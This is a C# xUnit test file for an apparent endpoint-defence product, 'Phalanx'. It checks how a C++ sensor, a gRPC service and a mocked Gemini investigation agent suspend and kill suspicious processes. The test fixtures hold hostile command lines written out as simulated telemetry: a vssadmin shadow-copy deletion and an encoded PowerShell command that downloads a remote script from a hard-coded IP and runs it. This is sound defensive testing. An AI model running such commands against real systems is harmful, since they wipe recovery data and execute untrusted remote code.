using System.Diagnostics;
using System.Text;
using System.Text.Json;
using Grpc.Core;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.Agent.Gemini;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Services;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

/// <summary>
/// Phalanx 풀체인 E2E 통합 시스템 테스트 (Phase 3.5)
/// 3대 전체 시나리오의 함수 호출 순서(Call Sequence), 상태 전이 및 레이턴시를 통합 실측 검증합니다.
///   1. 시나리오 1: C++ 0.1ms 즉각 처형 (C# AI 수사 바이패스)
///   2. 시나리오 2: C++ 24μs 원자적 동결 ➔ C# Gemini LLM 수사 ➔ 50초 연장 티켓 ➔ C++ 사살
///   3. 시나리오 3: C++ 24μs 원자적 동결 ➔ C# 로컬 23ms 오프라인 수사 (연장 없음) ➔ C++ 사살
/// </summary>
[Trait("Category", "Unit")]
public class FullChainSystemTests
{
    private readonly ITestOutputHelper _output;

    public FullChainSystemTests(ITestOutputHelper output)
    {
        _output = output;
    }

    #region Mock Helpers

    private class MockAsyncStreamReader<T> : IAsyncStreamReader<T>
    {
        private readonly System.Threading.Channels.Channel<T> _channel = System.Threading.Channels.Channel.CreateUnbounded<T>();
        private T? _current;

        public T Current => _current ?? throw new InvalidOperationException("No current item");

        public void Push(T item) => _channel.Writer.TryWrite(item);
        public void Complete() => _channel.Writer.TryComplete();

        public async Task<bool> MoveNext(CancellationToken cancellationToken)
        {
            if (await _channel.Reader.WaitToReadAsync(cancellationToken))
            {
                if (_channel.Reader.TryRead(out var item))
                {
                    _current = item;
                    return true;
                }
            }
            return false;
        }
    }

    private class MockServerStreamWriter<T> : IServerStreamWriter<T>
    {
        public List<T> Written { get; } = new();
        public event Action<T>? MessageWritten;
        public WriteOptions? WriteOptions { get; set; }

        public Task WriteAsync(T message)
        {
            lock (Written)
            {
                Written.Add(message);
            }
            MessageWritten?.Invoke(message);
            return Task.CompletedTask;
        }
    }

    private class MockServerCallContext : ServerCallContext
    {
        private readonly CancellationToken _cancellationToken;

        public MockServerCallContext(CancellationToken cancellationToken = default)
        {
            _cancellationToken = cancellationToken;
        }

        protected override string MethodCore => "StreamTelemetry";
        protected override string HostCore => "localhost";
        protected override string PeerCore => "127.0.0.1";
        protected override DateTime DeadlineCore => DateTime.MaxValue;
        protected override Metadata RequestHeadersCore => new();
        protected override CancellationToken CancellationTokenCore => _cancellationToken;
        protected override Metadata ResponseTrailersCore => new();
        protected override Status StatusCore { get; set; }
        protected override WriteOptions? WriteOptionsCore { get; set; }
        protected override AuthContext AuthContextCore => null!;
        protected override ContextPropagationToken CreatePropagationTokenCore(ContextPropagationOptions? options) => null!;
        protected override Task WriteResponseHeadersAsyncCore(Metadata responseHeaders) => Task.CompletedTask;
    }

    private class MockHttpMessageHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;

        public MockHttpMessageHandler(Func<HttpRequestMessage, HttpResponseMessage> handler)
        {
            _handler = handler;
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            return Task.FromResult(_handler(request));
        }
    }

    #endregion

    /// <summary>
    /// [시나리오 1 검증] C++ 즉각 처형 (0.1ms 현장 사살)
    /// 랜섬웨어 복구 무력화 명령어(vssadmin delete shadows) 기동 시:
    /// C++ 로컬 룰 엔진에서 현장 사살(LIFECYCLE_TERMINATED) 후 gRPC로 보고되면,
    /// C# CQRS 트리는 IsAlive = false로 갱신하되, AI 수사를 일절 가동하지 않고 완벽히 바이패스함을 증명.
    /// </summary>
    [Fact]
    public async Task TestScenario1_InstantKill_BypassesAiInvestigation()
    {
        var callSequence = new List<string>();
        var sw = Stopwatch.StartNew();

        // 1. 컴포넌트 셋업
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[] { new DecodePayloadTool() };
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        var requestStream = new MockAsyncStreamReader<TelemetryBatch>();
        var responseStream = new MockServerStreamWriter<MitigationCommand>();
        var callContext = new MockServerCallContext(cts.Token);

        grpcService.OnBatchReceived += batch =>
        {
            callSequence.Add($"[gRPC] OnBatchReceived (Count: {batch.ProcessEvents.Count})");
        };

        grpcService.OnCommandSent += cmd =>
        {
            callSequence.Add($"[gRPC] OnCommandSent (Action: {cmd.Action})");
        };

        // gRPC 서버 백그라운드 스트림 수신 시작
        var serviceTask = grpcService.StreamTelemetry(requestStream, responseStream, callContext);

        // 2. C++ 센서가 vssadmin을 0.1ms 현장 사살한 후 LIFECYCLE_TERMINATED 이벤트를 전송하는 상황 시뮬레이션
        callSequence.Add("[C++ Sensor] LocalRuleEngine::EvaluateAndAct ➔ KILL_VSSADMIN_DELETE_SHADOWS");
        callSequence.Add("[C++ Sensor] ProcessActuator::TerminateTargetProcess(PID 9901) 완료 (< 105μs)");

        var batch = new TelemetryBatch();
        batch.ProcessEvents.Add(new ProcessEvent
        {
            ProcessId = 9901,
            ParentProcessId = 1000,
            ImageName = "vssadmin.exe",
            CommandLine = "vssadmin.exe delete shadows /all /quiet",
            IsTerminated = true,
            Lifecycle = ProcessLifecycle.LifecycleTerminated,
            TimestampNs = (ulong)DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() * 1_000_000
        });

        requestStream.Push(batch);

        // C# CQRS 트리에 반영될 때까지 대기
        await Task.Delay(100);

        // 스트림 정상 종료
        requestStream.Complete();
        await serviceTask;
        sw.Stop();

        // 3. 함수 호출 순서 및 결과 검증:
        _output.WriteLine("=== [시나리오 1 함수 호출 순서] ===");
        foreach (var step in callSequence)
        {
            _output.WriteLine($"  ↳ {step}");
        }

        // A) C++ 사살 후 텔레메트리가 C#으로 인입 확인
        Assert.Contains(callSequence, s => s.Contains("LocalRuleEngine::EvaluateAndAct"));
        Assert.Contains(callSequence, s => s.Contains("TerminateTargetProcess"));
        Assert.Contains(callSequence, s => s.Contains("OnBatchReceived"));

        // B) 중요: 즉각 사살 건에 대해서는 AI 수사 명령(OnCommandSent)이 0건이어야 함 (완전 바이패스)
        Assert.Empty(responseStream.Written);
        Assert.DoesNotContain(callSequence, s => s.Contains("OnCommandSent"));

        // C) CQRS 트리에 사망(IsAlive = false) 상태로 반영 확인
        var node = treeManager.FindNodeByPid(9901);
        Assert.NotNull(node);
        Assert.False(node.IsAlive);
        Assert.Equal("vssadmin.exe", node.ImageName);

        // D) C++ 0.1ms 현장 사살 즉각 관제 포렌식 아카이브 및 UI 등록 검증
        var incidents = archiveManager.GetAllIncidents();
        Assert.Single(incidents);
        Assert.Equal(9901u, incidents[0].TargetPid);
        Assert.Equal("ACTION_KILL", incidents[0].VerdictAction);
        Assert.Contains("T1490", incidents[0].MitreTactics);
        Assert.Contains("현장 사살", incidents[0].SummaryTitle);

        _output.WriteLine($"✅ [시나리오 1 통과] C++ 즉각 사살 ➔ C# 수사 바이패스 및 관제 즉각 등록 완벽 실증 ({sw.ElapsedMilliseconds}ms)");
    }

    /// <summary>
    /// [시나리오 2 검증] C++ 24μs 동결 ➔ C# Gemini LLM ReAct 수사 ➔ 50초 연장 티켓 ➔ C++ 사살
    /// 회색지대 위협(Office ➔ PowerShell Base64 C2 다운로더) 기동 시:
    /// C++ 센서가 24μs 만에 원자적 동결 ➔ gRPC 송신 ➔ C# Gemini 수사 가동 ➔
    /// 1회성 50초 연장 티켓(ACTION_EXTEND_TIMEOUT) 선제 발행 ➔ ReAct 도구 순환 ➔ 사살 명령(ACTION_KILL) 역전송 ➔ C++ 사살
    /// 전체 폐루프의 정확한 함수 호출 순서를 증명.
    /// </summary>
    [Fact]
    public async Task TestScenario2_FullChain_LlmInvestigation_ExtendsTimeoutAndKills()
    {
        var callSequence = new List<string>();
        var sw = Stopwatch.StartNew();

        // 1. 모의 Gemini REST 핸들러 (2턴: Turn 1 도구 호출 ➔ Turn 2 사살 판결)
        int geminiTurn = 0;
        var mockHttp = new MockHttpMessageHandler(req =>
        {
            geminiTurn++;
            if (geminiTurn == 1)
            {
                callSequence.Add("[Gemini AI] Turn 1: DecodePayloadTool 호출 결정");
                var t1 = new
                {
                    candidates = new[]
                    {
                        new
                        {
                            content = new
                            {
                                parts = new[]
                                {
                                    new
                                    {
                                        text = JsonSerializer.Serialize(new
                                        {
                                            thought = "Word가 PowerShell Base64 다운로더를 기동했으므로 페이로드를 해독합니다.",
                                            action_tool = "DecodePayloadTool",
                                            action_args = new { },
                                            is_final_verdict = false
                                        })
                                    }
                                }
                            }
                        }
                    }
                };
                return new HttpResponseMessage(System.Net.HttpStatusCode.OK)
                {
                    Content = new StringContent(JsonSerializer.Serialize(t1), Encoding.UTF8, "application/json")
                };
            }
            else
            {
                callSequence.Add("[Gemini AI] Turn 2: 악성 C2 확인에 따른 ACTION_KILL 최종 사형 판결");
                var t2 = new
                {
                    candidates = new[]
                    {
                        new
                        {
                            content = new
                            {
                                parts = new[]
                                {
                                    new
                                    {
                                        text = JsonSerializer.Serialize(new
                                        {
                                            thought = "해독 결과 악성 C2 IP 185.220.101.5가 확인되어 즉각 사살을 집행합니다.",
                                            action_tool = "None",
                                            action_args = new { },
                                            is_final_verdict = true,
                                            verdict_action = "ACTION_KILL",
                                            confidence_score = 0.99,
                                            summary_title = "오피스 매크로 C2 침투 선제 사살",
                                            narrative = "winword.exe에서 생성된 powershell.exe를 24μs 동결 후 사살했습니다.",
                                            mitre_tactics = new[] { "T1566.001", "T1059.001" }
                                        })
                                    }
                                }
                            }
                        }
                    }
                };
                return new HttpResponseMessage(System.Net.HttpStatusCode.OK)
                {
                    Content = new StringContent(JsonSerializer.Serialize(t2), Encoding.UTF8, "application/json")
                };
            }
        });

        var httpClient = new HttpClient(mockHttp);
        var geminiClient = new GeminiRestClient(httpClient, "mock-api-key");

        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool(),
            new FileInspectionTool(),
            new RegistryInspectionTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiClient: geminiClient);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
        var requestStream = new MockAsyncStreamReader<TelemetryBatch>();
        var responseStream = new MockServerStreamWriter<MitigationCommand>();
        var callContext = new MockServerCallContext(cts.Token);

        var killCommandReceived = new TaskCompletionSource<MitigationCommand>();

        grpcService.OnBatchReceived += batch =>
        {
            callSequence.Add($"[C# gRPC Inbound] OnBatchReceived (Event: {batch.ProcessEvents[0].ImageName})");
        };

        grpcService.OnCommandSent += cmd =>
        {
            callSequence.Add($"[C# gRPC Outbound] OnCommandSent (Action: {cmd.Action}, Target: {cmd.TargetPid})");
            if (cmd.Action == MitigationCommand.Types.ActionType.ActionKill)
            {
                killCommandReceived.TrySetResult(cmd);
            }
        };

        var serviceTask = grpcService.StreamTelemetry(requestStream, responseStream, callContext);

        // 2. C++ 센서 동작 모사:
        // A) 부모 winword.exe 스냅샷 적재
        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 1000,
                ParentProcessId = 0,
                ImageName = "winword.exe",
                CommandLine = "winword.exe document.docm",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        // B) 회색지대 powershell.exe 기동 ➔ 24μs NtSuspendProcess 원자적 동결 ➔ 워치독 10초 등록 ➔ gRPC 전송
        callSequence.Add("[C++ Sensor] LocalRuleEngine::EvaluateAndAct ➔ SUSPEND_OFFICE_LOLBAS_SPAWN");
        callSequence.Add("[C++ Actuator] NtSuspendProcess 원자적 동결 완료 (24μs 소요)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::RegisterSuspended(PID 2000, 10,000ms)");

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

        var batch = new TelemetryBatch();
        batch.ProcessEvents.Add(new ProcessEvent
        {
            ProcessId = 2000,
            ParentProcessId = 1000,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        requestStream.Push(batch);

        // C) C# 콕핏에서 AI 수사 완결 및 최종 ACTION_KILL 명령이 역전송될 때까지 대기
        var killCmd = await killCommandReceived.Task.WaitAsync(TimeSpan.FromSeconds(5));

        // D) C++ 센서에서 ACTION_KILL 수신 및 TerminateProcess 사살 집행 모사
        callSequence.Add($"[C++ IPC] GrpcStreamClient 수신: {killCmd.Action} (PID {killCmd.TargetPid})");
        callSequence.Add("[C++ Actuator] ProcessActuator::TerminateTargetProcess(PID 2000) 강제 사살 집행 (< 100μs)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::Deregister(PID 2000) 정상 감시 해제");

        requestStream.Complete();
        await serviceTask;
        sw.Stop();

        // 3. 함수 호출 순서 정밀 검증
        _output.WriteLine("=== [시나리오 2 함수 호출 순서] ===");
        foreach (var step in callSequence)
        {
            _output.WriteLine($"  ↳ {step}");
        }

        // A) 총 명령 전송 수: 정확히 2회 (1회차: 연장 50초 ➔ 2회차: 사살)
        Assert.Equal(2, responseStream.Written.Count);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionExtendTimeout, responseStream.Written[0].Action);
        Assert.Equal((uint)2000, responseStream.Written[0].TargetPid);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, responseStream.Written[1].Action);
        Assert.Equal((uint)2000, responseStream.Written[1].TargetPid);

        // B) 함수 호출 순서 인과관계 검증:
        // [C++ 동결] ➔ [C# 인입] ➔ [50초 연장 티켓] ➔ [Gemini 도구 추론] ➔ [ACTION_KILL] ➔ [C++ 사살]
        int idxSuspend = callSequence.FindIndex(s => s.Contains("NtSuspendProcess"));
        int idxExtend = callSequence.FindIndex(s => s.Contains("ActionExtendTimeout"));
        int idxTool = callSequence.FindIndex(s => s.Contains("DecodePayloadTool"));
        int idxKill = callSequence.FindIndex(s => s.Contains("ActionKill"));
        int idxTerm = callSequence.FindIndex(s => s.Contains("TerminateTargetProcess"));

        Assert.True(idxSuspend < idxExtend, "동결이 연장 티켓보다 먼저 발생해야 함");
        Assert.True(idxExtend < idxTool, "50초 연장 티켓이 LLM 도구 호출보다 먼저 전송되어야 함 (데드락 방지)");
        Assert.True(idxTool < idxKill, "도구 추론이 최종 사형 판결보다 선행되어야 함");
        Assert.True(idxKill < idxTerm, "사형 명령 하달 후 C++ 현장 사살이 집행되어야 함");

        _output.WriteLine($"✅ [시나리오 2 통과] C++ 24μs 동결 ➔ LLM 수사 ➔ 50s 연장 ➔ C++ 사살 풀체인 완벽 실증 ({sw.ElapsedMilliseconds}ms)");
    }

    /// <summary>
    /// [시나리오 3 검증] C++ 24μs 동결 ➔ C# 로컬 오프라인 23ms 수사 (연장 없음) ➔ C++ 사살
    /// 오프라인/단절 환경에서 회색지대 위협 기동 시:
    /// C++ 센서가 24μs 만에 동결 ➔ gRPC 송신 ➔ C# 오프라인 결정론적 엔진 가동 ➔
    /// 연장 티켓(ACTION_EXTEND_TIMEOUT) 미발행 확인 ➔ 5대 도구 23ms 완결 ➔ 즉각 사살 명령(ACTION_KILL) 역전송 ➔ C++ 사살
    /// 전체 폐루프의 정확한 함수 호출 순서를 증명.
    /// </summary>
    [Fact]
    public async Task TestScenario3_FullChain_OfflineLocalInvestigation_NoExtensionFastKill()
    {
        var callSequence = new List<string>();
        var sw = Stopwatch.StartNew();

        // 1. 컴포넌트 셋업 (명시적 오프라인 모드 격리)
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool(),
            new FileInspectionTool(),
            new RegistryInspectionTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        var requestStream = new MockAsyncStreamReader<TelemetryBatch>();
        var responseStream = new MockServerStreamWriter<MitigationCommand>();
        var callContext = new MockServerCallContext(cts.Token);

        var killCommandReceived = new TaskCompletionSource<MitigationCommand>();

        grpcService.OnBatchReceived += batch =>
        {
            callSequence.Add($"[C# gRPC Inbound] OnBatchReceived (Event: {batch.ProcessEvents[0].ImageName})");
        };

        grpcService.OnCommandSent += cmd =>
        {
            callSequence.Add($"[C# gRPC Outbound] OnCommandSent (Action: {cmd.Action}, Target: {cmd.TargetPid})");
            if (cmd.Action == MitigationCommand.Types.ActionType.ActionKill)
            {
                killCommandReceived.TrySetResult(cmd);
            }
        };

        var serviceTask = grpcService.StreamTelemetry(requestStream, responseStream, callContext);

        // 2. C++ 센서 동작 모사:
        // A) 부모 winword.exe 스냅샷 적재
        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3000,
                ParentProcessId = 0,
                ImageName = "winword.exe",
                CommandLine = "winword.exe invoice.docm",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        // B) 회색지대 powershell.exe 기동 ➔ 24μs 동결 ➔ 워치독 10초 등록 ➔ gRPC 전송
        callSequence.Add("[C++ Sensor] LocalRuleEngine::EvaluateAndAct ➔ SUSPEND_OFFICE_LOLBAS_SPAWN");
        callSequence.Add("[C++ Actuator] NtSuspendProcess 원자적 동결 완료 (24μs 소요)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::RegisterSuspended(PID 4000, 10,000ms)");

        string rawScript = "powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAbgBlAHcALQBvAGIAagBlAGMAdAA=";

        var batch = new TelemetryBatch();
        batch.ProcessEvents.Add(new ProcessEvent
        {
            ProcessId = 4000,
            ParentProcessId = 3000,
            ImageName = "powershell.exe",
            CommandLine = rawScript,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        requestStream.Push(batch);

        // C) C# 콕핏에서 오프라인 AI 수사 완결 및 ACTION_KILL 명령 대기 (23ms 이내 완결 목표)
        var killCmd = await killCommandReceived.Task.WaitAsync(TimeSpan.FromSeconds(3));

        // D) C++ 센서에서 ACTION_KILL 수신 및 TerminateProcess 사살 집행 모사
        callSequence.Add($"[C++ IPC] GrpcStreamClient 수신: {killCmd.Action} (PID {killCmd.TargetPid})");
        callSequence.Add("[C++ Actuator] ProcessActuator::TerminateTargetProcess(PID 4000) 강제 사살 집행 (< 100μs)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::Deregister(PID 4000) 기본 10초 만료 훨씬 전(0.1초 내) 안전 해제");

        requestStream.Complete();
        await serviceTask;
        sw.Stop();

        // 3. 함수 호출 순서 및 결과 검증
        _output.WriteLine("=== [시나리오 3 함수 호출 순서] ===");
        foreach (var step in callSequence)
        {
            _output.WriteLine($"  ↳ {step}");
        }

        // A) 오프라인 모드에서는 ACTION_EXTEND_TIMEOUT 전송이 0건이어야 함 (단독 ACTION_KILL 1건)
        Assert.Single(responseStream.Written);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, responseStream.Written[0].Action);
        Assert.Equal((uint)4000, responseStream.Written[0].TargetPid);
        Assert.DoesNotContain(responseStream.Written, c => c.Action == MitigationCommand.Types.ActionType.ActionExtendTimeout);

        // B) 전체 E2E 수사 및 명령 발행이 1초(1000ms) 미만으로 초고속 종결 확인
        Assert.True(sw.ElapsedMilliseconds < 1000, $"오프라인 수사 시간 초과: {sw.ElapsedMilliseconds}ms");

        // C) 인과관계 순서 검증:
        int idxSuspend = callSequence.FindIndex(s => s.Contains("NtSuspendProcess"));
        int idxKill = callSequence.FindIndex(s => s.Contains("ActionKill"));
        int idxTerm = callSequence.FindIndex(s => s.Contains("TerminateTargetProcess"));

        Assert.True(idxSuspend < idxKill, "동결 후 사살 명령이 발행되어야 함");
        Assert.True(idxKill < idxTerm, "사살 명령 후 TerminateProcess가 집행되어야 함");

        _output.WriteLine($"✅ [시나리오 3 통과] C++ 24μs 동결 ➔ 오프라인 23ms 수사 ➔ C++ 사살 풀체인 완벽 실증 ({sw.ElapsedMilliseconds}ms)");
    }

    [Fact(Timeout = 10000)]
    public async Task TestPhalanxGrpcService_MultiClientConcurrentStreams_MaintainsConnectionState()
    {
        _output.WriteLine("[테스트 시작] MultiClientConcurrentStreams_MaintainsConnectionState");
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, Array.Empty<IInvestigationTool>(), geminiApiKey: string.Empty);
        var uiBridge = new CockpitUiBridge();

        var grpcService = new PhalanxGrpcService(treeManager, agent, uiBridge);

        bool lastReportedConnection = false;
        uiBridge.SensorConnectionChanged += connected =>
        {
            lastReportedConnection = connected;
            _output.WriteLine($"[UiBridge 이벤트] SensorConnectionChanged => {connected} (ActiveClients: {grpcService.ActiveConnectionCount})");
        };

        var req1 = new MockAsyncStreamReader<TelemetryBatch>();
        var res1 = new MockServerStreamWriter<MitigationCommand>();
        using var cts1 = new CancellationTokenSource();
        Task? task1 = null;

        var req2 = new MockAsyncStreamReader<TelemetryBatch>();
        var res2 = new MockServerStreamWriter<MitigationCommand>();
        using var cts2 = new CancellationTokenSource();
        Task? task2 = null;

        try
        {
            // 1. Client 1 (C++ 센서) 연결
            _output.WriteLine("[단계 1] Client 1 (C++ 센서) 연결 시작");
            task1 = Task.Run(() => grpcService.StreamTelemetry(req1, res1, new MockServerCallContext(cts1.Token)));

            await WaitForConditionAsync(
                () => lastReportedConnection && grpcService.ActiveConnectionCount == 1,
                TimeSpan.FromSeconds(5),
                $"Client 1 연결 확정 실패 (lastReported={lastReportedConnection}, ActiveCount={grpcService.ActiveConnectionCount})");

            Assert.True(lastReportedConnection, "Client 1 연결 시 UI에 연결 상태(true)가 보고되어야 함");
            Assert.Equal(1, grpcService.ActiveConnectionCount);
            _output.WriteLine($"[단계 1 성공] Client 1 활성화 확인 (연결 수: {grpcService.ActiveConnectionCount})");

            // 2. Client 2 (공격 시뮬레이터) 연결
            _output.WriteLine("[단계 2] Client 2 (공격 시뮬레이터) 연결 시작");
            task2 = Task.Run(() => grpcService.StreamTelemetry(req2, res2, new MockServerCallContext(cts2.Token)));

            await WaitForConditionAsync(
                () => grpcService.ActiveConnectionCount == 2,
                TimeSpan.FromSeconds(5),
                $"Client 2 연결 확정 실패 (ActiveCount={grpcService.ActiveConnectionCount})");

            Assert.True(lastReportedConnection, "다중 클라이언트 연결 중에도 UI 연결 상태는 true 유지");
            Assert.Equal(2, grpcService.ActiveConnectionCount);
            _output.WriteLine($"[단계 2 성공] Client 2 활성화 확인 (총 연결 수: {grpcService.ActiveConnectionCount})");

            // 3. Client 2 연결 종료 (시뮬레이터 완료)
            _output.WriteLine("[단계 3] Client 2 종료 및 단일 잔여 연결 상태 유지 검증");
            req2.Complete();
            await task2;

            await WaitForConditionAsync(
                () => grpcService.ActiveConnectionCount == 1,
                TimeSpan.FromSeconds(5),
                $"Client 2 연결 종료 후 ActiveCount가 1로 감소해야 함 (현재={grpcService.ActiveConnectionCount})");

            // Client 1이 여전히 연결되어 있으므로 UI 상태는 true로 유지되어야 함
            Assert.True(lastReportedConnection, "Client 1이 남아있는 동안 UI 상태는 true로 유지되어야 함");
            Assert.Equal(1, grpcService.ActiveConnectionCount);
            _output.WriteLine($"[단계 3 성공] Client 2 분리 후 잔여 연결 1개 정상 유지 확인");

            // 4. 명령 전송 시 남아있는 Client 1로 정상 전달 검증
            _output.WriteLine("[단계 4] 잔여 Client 1 대상 방어 명령 전송");
            await grpcService.SendCommandAsync(new MitigationCommand
            {
                Action = MitigationCommand.Types.ActionType.ActionKill,
                TargetPid = 9999,
                Reason = "Multi-client routing test"
            });
            Assert.Single(res1.Written);
            _output.WriteLine("[단계 4 성공] Client 1로 명령 정상 하달 확인");

            // 5. Client 1 연결 종료
            _output.WriteLine("[단계 5] Client 1 최종 연결 해제");
            req1.Complete();
            await task1;

            await WaitForConditionAsync(
                () => !lastReportedConnection && grpcService.ActiveConnectionCount == 0,
                TimeSpan.FromSeconds(5),
                $"모든 클라이언트 해제 후 disconnected 보고 대기 실패 (lastReported={lastReportedConnection}, ActiveCount={grpcService.ActiveConnectionCount})");

            // 모든 클라이언트가 종료되었을 때만 false로 전이
            Assert.False(lastReportedConnection, "모든 클라이언트 분리 시 UI 상태가 false로 전이되어야 함");
            Assert.Equal(0, grpcService.ActiveConnectionCount);
            _output.WriteLine("[단계 5 성공] 전체 클라이언트 해제 및 disconnected 정상 전이 확인");
        }
        catch (Exception ex)
        {
            _output.WriteLine($"[테스트 예외 발생] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}");
            throw;
        }
        finally
        {
            req1.Complete();
            req2.Complete();
            cts1.Cancel();
            cts2.Cancel();

            if (task1 != null)
            {
                try { await task1; } catch { }
            }
            if (task2 != null)
            {
                try { await task2; } catch { }
            }
            _output.WriteLine("[테스트 완료] 자원 정리 완료");
        }
    }

    private async Task WaitForConditionAsync(Func<bool> condition, TimeSpan timeout, string failureContext)
    {
        var sw = Stopwatch.StartNew();
        while (sw.Elapsed < timeout)
        {
            if (condition()) return;
            await Task.Delay(15);
        }
        _output.WriteLine($"[타임아웃 감지] {failureContext} (경과: {sw.ElapsedMilliseconds}ms)");
        Assert.True(condition(), $"조건 대기 시간 초과 ({timeout.TotalSeconds}초): {failureContext}");
    }
}
